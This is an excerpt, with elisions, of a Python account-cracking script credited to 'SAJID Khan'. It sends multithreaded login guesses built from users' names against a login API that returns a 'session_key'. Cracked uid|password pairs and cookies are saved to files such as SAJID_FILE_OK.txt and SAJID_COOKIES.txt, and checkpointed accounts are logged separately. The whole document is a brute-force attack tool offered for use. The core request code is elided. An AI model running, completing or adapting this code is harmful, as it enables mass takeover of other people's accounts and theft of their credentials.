# Orignally Written By SAJID Khan
...
logo=("""
   ...
   \x1b[38;5;196m_____             _ _____ _____   
  \x1b[38;5;196m/ ____|  /\       | |_   _|  __ \  
\x1b[38;5;196m | (___   /  \      | | | | | |  | | 
  \x1b[38;5;196m\___ \ / /\ \ _   | | | | | |  | | 
  \x1b[38;5;196m____) / ____ \ |__| |_| |_| |__| | 
 |\x1b[38;5;196m_____/_/    \_\____/|_____|_____/""")
...
#	print('\033[1;37m example :\033[1;37mfirst last, firtslast, first123')
	...
	with tred(max_workers=30) as SAJID:
		...
		for user in fo:
			...
			passlist = plist
			if methd =='1':
				SAJID.submit(api1,ids,names,passlist)
			else:
				SAJID.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[SAJID]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[SAJID-OK] '+uid+' | '+pas)
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'SAJID_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'SAJID_COOKIES.txt')
						...
						#print(f'\r\r\33[1m\33[1;35m [SAJID-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'SAJID-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[SAJID-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					uid = str(po['uid'])
					print('\r\r\033[1;32m [SAJID-OK] '+uid+' | '+pas)
					file_path = os.path.join(folder_path, 'SAJID_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
